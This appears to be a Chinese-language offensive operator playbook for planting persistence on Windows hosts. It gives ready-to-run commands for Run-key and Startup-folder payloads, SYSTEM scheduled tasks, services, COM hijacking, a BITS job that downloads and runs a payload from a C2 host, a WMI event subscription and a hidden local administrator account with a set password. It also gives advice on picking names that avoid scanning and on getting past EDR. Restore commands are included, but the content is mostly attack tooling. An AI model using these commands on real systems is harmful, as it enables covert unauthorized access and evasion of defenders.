# Windows host-native 持久化

> **TECH：** 登录/开机后拉起操作者 payload  
> **成功：** 查询到对象存在，且约定触发后有回连或进程  
> **GATES：** HKCU 任意用户；HKLM/服务/SYSTEM 任务要 admin  
> **不是：** AD 持久化、WDAC 排除（`/edr-bypass`）

投放前备份原键/原任务 XML。名称不要用 `Update`/`BackupSvc` 这种人人扫描的词，用环境里像真的名字。

---

## 1. HKCU Run / Startup（低权）

```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v <Name> /t REG_SZ /d "C:\Users\Public\payload.exe" /f
copy payload.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe"
```

验证：`reg query ...\Run`、注销再登录。  
RESTORE：`reg delete ... /v <Name> /f`、删 Startup 文件。

---

## 2. HKLM Run（admin）

```cmd
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v <Name> /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f
```

RESTORE：`reg delete` 同一键。

---

## 3. 计划任务

```cmd
schtasks /create /tn "<LookLikeTask>" /tr "C:\Windows\Temp\payload.exe" /sc onlogon /ru SYSTEM
schtasks /query /tn "<LookLikeTask>" /fo LIST /v
schtasks /run /tn "<LookLikeTask>"
```

无 SYSTEM 时去掉 `/ru SYSTEM`，用当前用户 `/sc onlogon`。

RESTORE：`schtasks /delete /tn "<LookLikeTask>" /f`

---

## 4. 服务（admin）

```cmd
sc create <SvcName> binpath= "C:\Windows\Temp\payload.exe" start= auto obj= LocalSystem
sc start <SvcName>
sc qc <SvcName>
```

payload 必须是长期进程或服务形态；一次性 `-e cmd` 的 nc 会立刻退，任务比服务更合适。

RESTORE：`sc stop <SvcName> & sc delete <SvcName>`

---

## 5. COM 劫持（HKCU）

登录时高完整性不必需。劫持当前用户会加载的 InprocServer32：

```cmd
reg add "HKCU\Software\Classes\CLSID\{CLSID}\InprocServer32" /ve /d "C:\Users\Public\hijack.dll" /f
```

CLSID 必须是该用户登录会 CoCreate 的。乱写无效。验证：注销登录后 DLL 是否被加载（Procmon）或回连。

RESTORE：`reg delete "HKCU\Software\Classes\CLSID\{CLSID}" /f`

---

## 6. BITS（可选）

```cmd
bitsadmin /create /download <Job>
bitsadmin /addfile <Job> https://C2/payload.exe C:\Users\Public\payload.exe
bitsadmin /SetNotifyCmdLine <Job> C:\Users\Public\payload.exe NULL
bitsadmin /resume <Job>
bitsadmin /list /allusers /verbose
```

重启后 job 状态因系统而异，必须再 `bitsadmin /list` 验证。不稳就改任务。

RESTORE：`bitsadmin /cancel <Job>`

---

## 7. WMI 事件订阅（admin，高噪声）

**不是 EDR 盲区。** Sysmon 19/20/21 与主流 EDR 都盯 `__FilterToConsumerBinding`。仅当操作者明确要这条。

```powershell
$f = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{
  Name='<Filter>'; EventNamespace='root\cimv2'; QueryLanguage='WQL'
  Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_PerfFormattedData_PerfOS_System"'}
$c = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments @{
  Name='<Consumer>'; CommandLineTemplate='C:\Windows\Temp\payload.exe'}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{ Filter=$f; Consumer=$c }
```

验证：`Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding`

RESTORE：

```powershell
Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -match '<Filter>' } | Remove-WmiObject
Get-WMIObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object { $_.Name -eq '<Consumer>' } | Remove-WmiObject
Get-WMIObject -Namespace root\subscription -Class __EventFilter | Where-Object { $_.Name -eq '<Filter>' } | Remove-WmiObject
```

---

## 8. 隐藏本地账户（吵）

```cmd
net user support$ 'P@ssw0rd!' /add
net localgroup administrators support$ /add
```

`$` 只骗 `net user` 默认列表，可被其它枚举看到。授权靶场可用，企业里很响。

RESTORE：`net user support$ /delete`

---

## 验证清单

```text
对象 query 成功
触发一次（run / 登录）有进程或 C2 回连
notes 写：名称、路径、权限、RESTORE 一行命令
落地被隔离 → /edr-bypass 后换路径再写同一原语
```
